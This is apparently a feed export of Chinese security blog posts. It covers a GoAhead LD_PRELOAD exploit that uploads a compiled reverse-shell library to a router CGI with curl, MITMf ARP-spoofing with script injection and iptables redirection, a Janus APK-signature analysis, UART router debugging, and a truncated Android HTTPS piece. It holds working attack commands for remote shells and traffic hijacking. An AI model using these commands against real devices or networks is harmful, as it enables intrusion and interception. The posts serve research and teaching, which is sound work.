<figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./mipsel-linux-gcc -shared -fPIC mipsel-<span class="built_in">reverse</span>-tcp.<span class="built_in">c</span> -o mipsel-<span class="built_in">reverse</span>-tcp.so</div></pre></td></tr></table></figure>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>本地 nc 监听 5555 端口，把生成的so文件post到目标</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -X POST   -b  <span class="string">"user=admin;platform=0"</span>  --data-binary <span class="meta">@payloads</span><span class="regexp">/mipsel-reverse-tcp.so   http:/</span><span class="regexp">/192.168.16.1/</span>cgi-bin<span class="regexp">/upload_settings.cgi?LD_PRELOAD=/</span>proc<span class="regexp">/self/</span>fd/<span class="number">0</span></div></pre></td></tr></table></figure>
<p><img src="http://p1aqjecep.bkt.clouddn.com/15137897078140.jpg" alt=""></p>
<p>成功反弹shell<br><img src="http://p1aqjecep.bkt.clouddn.com/15137898902411.jpg" alt=""></p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol>
<li>在挖掘IOT设备应用层漏洞时，也需要去关注系统组件的安全。</li>
<li>如果goahead 的cgi 程序无需登录可以访问，可以直接配合csrf 打内网。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li>Remote LD_PRELOAD Exploitation   <a href="https://www.elttam.com.au/blog/goahead" rel="external nofollow noopener noreferrer" target="_blank">https://www.elttam.com.au/blog/goahead</a></li>
<li>routesplite  <a href="https://github.com/reverse-shell/routersploit" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/reverse-shell/routersploit</a></li>
<li>硬件调试  <a href="http://future-sec.com/iot-security-hardware-debuging.html" rel="external nofollow noopener noreferrer" target="_blank">http://future-sec.com/iot-security-hardware-debuging.html</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="goahead" scheme="http://www.future-sec.com/tags/goahead/"/>
    
  </entry>
  
  <entry>
    <title>使用MITMF中间人攻击非80端口的HTTP</title>
    <link href="http://www.future-sec.com/using-MITMF-attack-not-80-port-http.html"/>
    <id>http://www.future-sec.com/using-MITMF-attack-not-80-port-http.html</id>
    <published>2017-12-20T16:00:00.000Z</published>
    <updated>2017-12-21T07:42:22.081Z</updated>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。<br>例如注入一段js</p>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">sudo </span> <span class="string">python </span><span class="string">mitmf.</span><span class="string">py </span> -i <span class="string">wlan0 </span><span class="built_in">--spoof</span> <span class="built_in">--arp</span> <span class="built_in">--target</span>  <span class="string">172.</span><span class="string">18.</span><span class="string">219.</span>3 <span class="built_in">--gateway</span>  <span class="string">172.</span><span class="string">18.</span><span class="string">219.</span>1  <span class="built_in">--inject</span> <span class="built_in">--html-payload</span> <span class="string">'&lt;script&gt;alert(0)&lt;/script&gt;'</span></div></pre></td></tr></table></figure>
<p>victim 访问<br><a href="http://yaseng.org/project" rel="external nofollow noopener noreferrer" target="_blank">http://yaseng.org/project</a></p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/15129397954576.jpg" alt=""></p>
<p>访问非80端口的http web<br><a href="http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml" rel="external nofollow noopener noreferrer" target="_blank">http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml</a><br>无任何提示  </p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/15129398489571.jpg" alt=""></p>
<p>attack 端</p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/Screenshot35.jpg" alt="img"></p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>简单看了一下代码<br>MITMf/core/utils.py   line:84</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def HTTP(self, http_redir_port):</div><div class="line">    <span class="built_in">log</span>.<span class="built_in">debug</span>(<span class="string">"Setting iptables HTTP redirection rule from port 80 to &#123;&#125;"</span>.<span class="built_in">format</span>(http_redir_port))</div><div class="line">    <span class="built_in">os</span>.system(<span class="string">'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port &#123;&#125;'</span>.<span class="built_in">format</span>(http_redir_port))</div></pre></td></tr></table></figure>
<p>iptables 把80端口的mitmf 监听的10000端口，很显然，需要劫持哪个端口，加一条规则就行了。<br>例如 </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo  iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --destination-port 8080 -j REDIRECT --to-port  10000</div></pre></td></tr></table></figure>
<p>attack</p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/Screenshot36.jpg" alt="mg"><br>victim<br><img src="http://ozuqqvmm5.bkt.clouddn.com/15129405294732.jpg" alt=""></p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>使用mitmf 来绕过HSTS站点抓取登陆明文  <a href="http://yaseng.org/hsts-bypass-with-mitmf.html" rel="external nofollow noopener noreferrer" target="_blank">http://yaseng.org/hsts-bypass-with-mitmf.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h2&gt;&lt;p&gt;MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。&lt;/p&gt;
&lt;h2 id=&quot;问题&quot;&gt;&lt;a hre
    
    </summary>
    
      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://www.future-sec.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="MITMf" scheme="http://www.future-sec.com/tags/MITMf/"/>
    
  </entry>
  
  <entry>
    <title>Janus漏洞(CVE-2017-13156)分析</title>
    <link href="http://www.future-sec.com/Janus-CVE-2017-13156-analysis.html"/>
    <id>http://www.future-sec.com/Janus-CVE-2017-13156-analysis.html</id>
    <published>2017-12-20T16:00:00.000Z</published>
    <updated>2017-12-21T07:53:50.474Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Android系统要求每一个Android应用程序必须要经过数字签名才能够安装到系统中，也就是说如果一个Android应用程序没有经过数字签名，是没有办法安装到系统中的。Android通过数字签名来标识应用程序的作者和在应用程序之间建立信任关系，不是用来决定最终用户可以安装哪些应用程序。这个数字签名由应用程序的作者完成，并不需要权威的数字证书签名机构认证，它只是用来让应用程序包自我认证的。然而Google在本月4日发布的Android安全公告中编号为CVE-2017-13156，这个漏洞被称为Janus漏洞，利用该漏洞可修改app而不影响原始签名。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Android-app签名校验简单介绍"><a href="#Android-app签名校验简单介绍" class="headerlink" title="Android app签名校验简单介绍"></a>Android app签名校验简单介绍</h3><p>在Android源码中“frameworks/base/core/java/android/content/pm/PackageParser.java”中。PackageParser类的collectCertificates方法会对APK进行签名校验，并且遍历APK中的所有文件，对每个文件进行校验。下面是该方法的源码：<br><img src="http://p1aqjecep.bkt.clouddn.com/image002.jpg" alt="img"><br><img src="http://p1aqjecep.bkt.clouddn.com/image004.jpg" alt="img"><br>APK是一个ZIP格式的文件，因此使用ZIP相关的类进行读写。在上面代码中调用了loadCertificates，这个方法会返回一个二维数组，当APK中的文件签名校验失败，loadCertificates方法会返回一个空数组（可能是null，可能是数组长度为0），那么依照上面代码的逻辑如果数组为空则会抛出异常。<br>loadCertificates方法的代码见下：<br><img src="http://p1aqjecep.bkt.clouddn.com/image006.jpg" alt="img"><br>其中is是JarFile.JarFileInputStream类的对象。loadCertificates调用了readFullyIgnoringContents，在readFullyIgnoringContents中会调用JarFile.JarFileInputStream.read（JarFile类在“libcore/luni/src/main/java/java/util/jar/JarFile.java”文件中）<br>读取APK中一项数据，在read方法中会校验读取到的数据项的签名，如果签名校验失败，则会抛出SecurityException类型的异常，即签名校验失败。<br>上面代码调用了StrictJarFile.getCertificateChains方法，在/ libcore / luni / src / main / java / java / util / jar / StrictJarFile.java里面。下面是它的代码：<br><img src="http://p1aqjecep.bkt.clouddn.com/image007.jpg" alt="img"><br>上面的isSigned在下面的代码里面获取的：<br><img src="http://p1aqjecep.bkt.clouddn.com/image009.jpg" alt="img"><br>当证书读取成功，而且APK经过了签名，isSigned为true。<br>回到StrictJarFile.getCertificateChains中，当isSigned为true时会调用JarVerifier.getCertificateChains方法，下面是它的代码：<br><img src="http://p1aqjecep.bkt.clouddn.com/image010.jpg" alt="img"><br>verifiedEntries的声明：<br><img src="http://p1aqjecep.bkt.clouddn.com/image012.jpg" alt="img"><br>verifiedEntries是一个键值对，键是APK中经过了签名的文件名，如：classes.dex文件，值是证书数组。如果向已经签过名的APK中新添加一个文件然后安装这个APK，当程序逻辑执行到JarVerifier.getCertificateChains中时，在verifiedEntries里面无法找到新添加的文件名（因为这个新文件是在APK签名之后添加），那么JarVerifier.getCertificateChains方法将返回null。<br>以上就是整个对于app签名的简单分析。</p>
<h3 id="签名方案"><a href="#签名方案" class="headerlink" title="签名方案"></a>签名方案</h3><p>参考google官方文档获得:<br>APK 签名方案<br>Android 支持两种应用签名方案，一种是基于 JAR 签名的方案（v1 方案），另一种是 Android Nougat (Android 7.0) 中引入的 APK 签名方案 v2（v2 方案）。<br>JAR 签名（v1 方案）<br>v1 签名并非保护整个apk文件，例如 ZIP 元数据就不受保护。再者，APK 验证程序需要处理大量不可信（尚未经过验证）的数据结构，而不受签名保护的数据不在处理的行列中。这会导致相当大的受攻击面。此外，APK 验证程序必须解压所有已压缩的条目，而这需要花费更多时间和内存。为了解决这些问题，Android 7.0 中引入了 APK 签名方案 v2。<br>APK 签名方案 v2（v2 方案）<br>Android 7.0 中引入了 APK 签名方案 v2（v2 方案）。该方案会对 APK 的内容进行hash处理和签名，然后将生成的“APK 签名分块”插入到 APK 中。<br>在验证期间，v2 方案会将 APK 文件视为 Blob，并对整个文件进行签名检查。对 APK 进行的任何修改（包括对 ZIP 元数据进行的修改）都会使 APK 签名作废。这种形式的 APK 验证不仅速度要快得多，而且能够发现更多种未经授权的修改。<br>同时，新的签名格式向后兼容，使用这种新格式签名的 APK（必须也使用v1） 可在更低版本的 Android 设备上进行安装（会直接忽略添加到 APK 的额外数据）。</p>
<h3 id="apk签名校验方式"><a href="#apk签名校验方式" class="headerlink" title="apk签名校验方式"></a>apk签名校验方式</h3><p>为了提高兼容性，应同时采用 v1 和 v2 这两种方案对应用进行签名。与只使用v1 方案签名的应用相比，经过 v2 方案签名的应用能够更快速地安装到 Android Nougat 以及更高版本的设备上。但是更低版本的 Android 平台会忽略 v2 签名，这就需要应用包含 v1 签名。<br><img src="http://p1aqjecep.bkt.clouddn.com/image014.jpg" alt="img"><br>验证程序会对照存储在“APK 签名分块”中的 v2 签名对 APK 的全文件hash进行验证。该hash涵盖除“APK 签名分块”（其中包含 v2 签名）之外的所有内容。在“APK 签名分块”以外对 APK 进行的任何修改都会使 APK 的 v2 签名作废。v2 签名被删除的 APK 也会被拒绝，因为 v1 签名指明相应 APK 带有 v2 签名，所以 Android Nougat 及更高版本会拒绝使用 v1 签名验证 APK。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Janus漏洞主要是向APK里面添加额外的DEX文件。一方面，APK文件是zip文件，可以包含初始时的任意字节，在它的zip条目（实际情况下更多是在zip条目里面）。但是JAR签名方案只考虑了zip入口。当计算或者校验apk的签名的时候，它忽略了其他字节。另一方面，在字符串、类、方法定义等常规部分之后，一个DEX文件可以包含任意的字节。综上所述，一个文件可以同时包含一个APK文件和一个DEX文件。<br><img src="http://p1aqjecep.bkt.clouddn.com/image016.jpg" alt="img"><br>另一个关键点是Dalvik / ART虚拟机方面。android运行加载APK文件，提取它的DEX文件，然后运行它的代码。在实践中，虚拟机可以加载和执行APK文件。当它得到APK文件时，它仍然会查看header的magic字节来判断它是什么类型的文件，如果找到一个DEX类型的，就会将文件载入为DEX文件，否则就会将文件加载为一个APK文件，其中包括一个带有DEX的zip文件。因此，既可以读取DEX文件又可以读取APK文件。<br>所以攻击者可以利用着这种二元性，在不影响其签名的情况下将一个恶意DEX文件预先添加到APK文件里面，然后，android运行时接受APK文件作为一个合法的早期版本的应用程序的有效更新，但是Dalvik虚拟机从注入的DEX文件中加载代码，从而实现攻击。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="http://p1aqjecep.bkt.clouddn.com/image018.jpg" alt="img"><br>原来的apk主要代码<br><img src="http://p1aqjecep.bkt.clouddn.com/image019.jpg" alt="img"><br><img src="http://p1aqjecep.bkt.clouddn.com/image021.jpg" alt="img"><br>修改了dex文件，将Log.i(“janus”,”点击事件”);修改为Toast.makeText(getApplicationContext(),”I steal your car.”,Toast.LENGTH_LONG).show();<br><img src="http://p1aqjecep.bkt.clouddn.com/image023.jpg" alt="img"><br><img src="http://p1aqjecep.bkt.clouddn.com/image024.jpg" alt="img"><br>安装合并好的1.apk<br><img src="http://p1aqjecep.bkt.clouddn.com/image026.jpg" alt="img"><br><img src="http://p1aqjecep.bkt.clouddn.com/image027.jpg" alt="img"><br>测试<br><img src="http://p1aqjecep.bkt.clouddn.com/image029.jpg" alt="img"><br>攻击完成</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>该漏洞仅影响基于 JAR 签名的方案（v1 方案）。不影响自Android 7.0 以来引入的 APK 签名方案 v2（v2 方案）。</p>
<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>可被添加恶意dex文件可以进行一些敏感性的操作，例如窃取用户数据、监控手机等高危操作。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://source.android.com/security/apksigning/v2#verification" rel="external nofollow noopener noreferrer" target="_blank">https://source.android.com/security/apksigning/v2#verification</a><br><a href="https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures" rel="external nofollow noopener noreferrer" target="_blank">https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;Android系统要求每一个Android应用程序必须要经过数字签名才能够安装到系统中，也就是说如果一个Android应用程序没有经过数字签
    
    </summary>
    
      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="移动安全" scheme="http://www.future-sec.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
      <category term="app签名" scheme="http://www.future-sec.com/tags/app%E7%AD%BE%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-串口调试</title>
    <link href="http://www.future-sec.com/iot-security-hardware-debuging.html"/>
    <id>http://www.future-sec.com/iot-security-hardware-debuging.html</id>
    <published>2017-12-04T16:00:00.000Z</published>
    <updated>2017-12-26T03:06:07.555Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态调试。</p>
<h2 id="UART串口调试"><a href="#UART串口调试" class="headerlink" title="UART串口调试"></a>UART串口调试</h2><p>UART调试第一步需要先找到对应的四个PIN，在通电情况下，VCC口可以不要接，判断 GND, RX, TX三个引脚是调试的关键，找四个引脚可以先看PCB上的印字。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image65.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image66.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image67.jpg" alt="img"><br>但多数厂商在量产前会去掉用于调试的串口印字，如果找不到对应引脚的印字，就需要先分析PCB的结构，一般PCB上有3、4 、5个并排或相距不远的焊点或通孔，就有可能是UART调试串口。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image68.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image69.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image70.jpg" alt="img"><br>但PCB上可能存在多个这样的焊点或通孔，从多个口中找出真正的调试串口，就需要借助到万用表。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image101.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image102.jpg" alt="img"><br>万用表找串口首先需要找到GND口，就是接地口，在疑似串口的焊点处，通过测量电势差，可以判断出GND口，通过连接焊点和输入负极，如果电势为0，就可能是GND口，如果电势为最大值，例如3.6V、5V等，就可能是VCC口。然后通过UART转换器对应的4个口，引出导线，并设置好串口输出环境后，就可以依次尝试。也可以通过短接其中的两口，如果机器重启，就可以判断这两口为VCC和GND。<br>需要注意的是，在TTL电平模式下，UATR转换接口上的RX、TX口与上位设备，也就是PCB上的UART口的RX和TX是需要反接的。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image71.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image72.jpg" alt="img"></p>
<h3 id="案例一：调试某智能摄像头"><a href="#案例一：调试某智能摄像头" class="headerlink" title="案例一：调试某智能摄像头"></a>案例一：调试某智能摄像头</h3><p>通过万用表测量电势差之后，在靠近CPU的地方有三个通孔，有可能是UART串口，用导线连接之后，设置波特率为115200。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image73.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image35.jpg" alt="img"><br>用SecureCRT连接串口，给机器通上电之后，串口立马输出了启动信息，并可以执行命令，说明串口正确，如果遇到无法输入的情况，首先检查接线是否松动，然后在SecureCRT中的， Session Options -&gt; Connection -&gt; Serial -&gt; Flow Control，将原先选中的 RTS/CTS取消掉，这是因为如果选中了RTS/CTS ，则硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。如果串口输出为乱码，则需要切换波特率，直至输出正常。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image74.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image75.jpg" alt="img"></p>
<h3 id="案例二：调试某路由器"><a href="#案例二：调试某路由器" class="headerlink" title="案例二：调试某路由器"></a>案例二：调试某路由器</h3><p>在靠近cpu的地方有四个通孔，测量电势差后，利用导线探针，确定了三个PIN，连接转换器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image76.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image77.jpg" alt="img"><br>串口中输出调试信息，因波特率设置问题，初始输出为乱码，改为38400即可正常输出。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image78.jpg" alt="img"></p>
<h3 id="案例三：调试某路由器"><a href="#案例三：调试某路由器" class="headerlink" title="案例三：调试某路由器"></a>案例三：调试某路由器</h3><p>在PCB上有四个焊点，先测量电势差，分出GND和VCC，在利用焊枪分别焊上导线，连接转换接口，测试出TX和RX口。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image79.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image80.jpg" alt="img"><br>设置波特率为57600，串口输出正确，并可执行命令。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image81.jpg" alt="img"></p>
<h3 id="案例四：调试某路由器"><a href="#案例四：调试某路由器" class="headerlink" title="案例四：调试某路由器"></a>案例四：调试某路由器</h3><p>在PCB一侧有5个通孔，并标注有UART-0字样，通电后，测试各口电势差，确实GND和VCC后，连接转换接口，并测试出RX和TX口。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image82.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image83.jpg" alt="img"><br>设置波特率为57600，串口输出正确，并可执行命令。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image84.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image85.jpg" alt="img"><br>通过本地架设的tftp服务器，并在串口输入命令，开启相关服务，就可以通过tftp与机器传输文件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image86.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image87.jpg" alt="img"></p>
<h3 id="案例五：调试某无线数据终端"><a href="#案例五：调试某无线数据终端" class="headerlink" title="案例五：调试某无线数据终端"></a>案例五：调试某无线数据终端</h3><p>拆开正面压板，发现PCB上标注有印字，利用PCB夹具和探针，引出RX和TX口，连接转换器，因该无线终端串口电压不超过1.7V，焊接容易造成信号衰减，因此采用夹具。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image88.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image89.jpg" alt="img"><br>因串口输出信息过多，影响输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image90.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image91.jpg" alt="img"></p>
<h3 id="案例六：调试某语音机器人"><a href="#案例六：调试某语音机器人" class="headerlink" title="案例六：调试某语音机器人"></a>案例六：调试某语音机器人</h3><p>拆解机器，该型机器采用多块电路板层级设计，其主要处理芯片位于顶部，拆解时注意走线位置，防止拉坏接线口，在PCB上有UART的PIN口印字，给每一个PIN口焊上导线，连接转换器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image122.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image123.jpg" alt="img"><br>设置波特率为921600，连接串口，用root账号登陆，密码为空，成功进入系统，执行命令。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image124.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image125.jpg" alt="img"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上篇介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="UART串口调试" scheme="http://www.future-sec.com/tags/UART%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>你在互联网上的数据还在裸奔吗？</title>
    <link href="http://www.future-sec.com/android-ssl-security.html"/>
    <id>http://www.future-sec.com/android-ssl-security.html</id>
    <published>2017-12-04T16:00:00.000Z</published>
    <updated>2017-12-21T07:35:04.370Z</updated>
    
    <content type="html"><![CDATA[<p>这是今年三月份有关移动市场的统计数据,移动app的数量已经突破10亿。移动安全也成为了一个全民关注的问题。从最初的app只针对功能实现，爆出来了一系列的高危漏洞之后，应运而生了包括移动app检测、app加固保护等工作来保护开发者以及使用者权益。同时，http的明文数据传输问题也得到了有效解决。我们本篇文章的讨论内容还是从数据传输过程中所引发的一系列安全问题。 <img src="http://ozuqqvmm5.bkt.clouddn.com/20170418102254459.jpg" alt="img"></p>
<h2 id="数据裸奔时代"><a href="#数据裸奔时代" class="headerlink" title="数据裸奔时代"></a>数据裸奔时代</h2><h3 id="使用http协议的数据传输方式"><a href="#使用http协议的数据传输方式" class="headerlink" title="使用http协议的数据传输方式"></a>使用http协议的数据传输方式</h3><p>HyperText Transfer Protocol，超文本传输协议，是互联网上使用最广泛的一种协议，所有WWW文件必须遵循的标准。HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全。<br>使用TCP端口为：80<br>最初的移动app开发过程中，使用的大部分http协议来进行客户端跟服务端的通信。这个过程中传输的信息都是明文，继而引发了一系列的信息泄露等漏洞.<br><img src="http://ozuqqvmm5.bkt.clouddn.com/httpa.png" alt="img"><br>wireshark简单捕获就能看到明文隐私数据<br><img src="http://ozuqqvmm5.bkt.clouddn.com/httpb.png" alt="img"><br>当然上述极为不安全的数据传输，在2015年被大量爆出来之后，立即引起了app的开发人员以及使用着的重视。后续的数据传输使用了相对安全的基于SSL/TLS加密的安全的超文本传输协议https。</p>
<h2 id="你所使用的加密数据传输真的有保证你的数据不被窃取吗？"><a href="#你所使用的加密数据传输真的有保证你的数据不被窃取吗？" class="headerlink" title="你所使用的加密数据传输真的有保证你的数据不被窃取吗？"></a>你所使用的加密数据传输真的有保证你的数据不被窃取吗？</h2><h3 id="https加密传输"><a href="#https加密传输" class="headerlink" title="https加密传输"></a>https加密传输</h3><p>Hyper Text Transfer Protocol over Secure Socket Layer，安全的超文本传输协议，网景公式设计了SSL(Secure Sockets Layer)协议用于对Http协议传输的数据进行加密，保证会话过程中的安全性。<br>使用TCP端口默认为443<br>SSL协议即用到了对称加密也用到了非对称加密(公钥加密)，在建立传输链路时，SSL首先对对称加密的密钥使用公钥进行非对称加密，链路建立好之后，SSL对传输内容使用对称加密。<br>对称加密</p>
<p>速度高，可加密内容较大，用来加密会话过程中的消息<br>公钥加密 加密速度较慢，但能提供更好的身份认证技术，用来加密对称加密的密钥</p>
<h3 id="HTTPs单向认证机制"><a href="#HTTPs单向认证机制" class="headerlink" title="HTTPs单向认证机制"></a>HTTPs单向认证机制</h3><p>单向认证主要是客户端保存有服务端的公钥证书，自己本身是没有私钥证书的。<br>1、给服务器生成密钥方式：<br>keytool -genkeypair -alias skxy -keyalg RSA -validity 3650 -keypass 123456 -storepass 123456 -keystore skxy.keystore<br>2、给Tomcat服务器配置Https<br>tomcat/config/server.xml修改connector配置<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;Connector port=<span class="string">"8443"</span> protocol=<span class="string">"org.apache.coyote.http11.Http11Protocol"</span></div><div class="line">        maxThreads=<span class="string">"150"</span> SSLEnabled=<span class="string">"true"</span> scheme=<span class="string">"https"</span> secure=<span class="string">"true"</span></div><div class="line">        clientAuth=<span class="string">"false"</span> sslProtocol=<span class="string">"TLS"</span></div><div class="line">        keystoreFile=<span class="string">"conf/skxy.keystore"</span></div><div class="line">        keystorePass=<span class="string">"123456"</span>/&gt;</div></pre></td></tr></table></figure></p>
<p>3、导出证书<br>keytool -export -alias skxy -file skxy.cer -keystore skxy.keystore -storepass 123456<br>4、将证书放在android客户端，能够读取的地方比如assert目录 5.代码中执行网络请求，获取证书，读取https网站的数据。<br>客户端单向认证代码实现部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">String path = <span class="string">"https://10.0.3.2:8443/Test/Hlloer"</span>;</div><div class="line">?</div><div class="line">   <span class="keyword">try</span> &#123;  </div><div class="line">       <span class="comment">//获取证书  </span></div><div class="line">       InputStream stream = getAssets().open(<span class="string">"skxy.cer"</span>);  </div><div class="line">       SSLContext tls = SSLContext.getInstance(<span class="string">"TLS"</span>);  </div><div 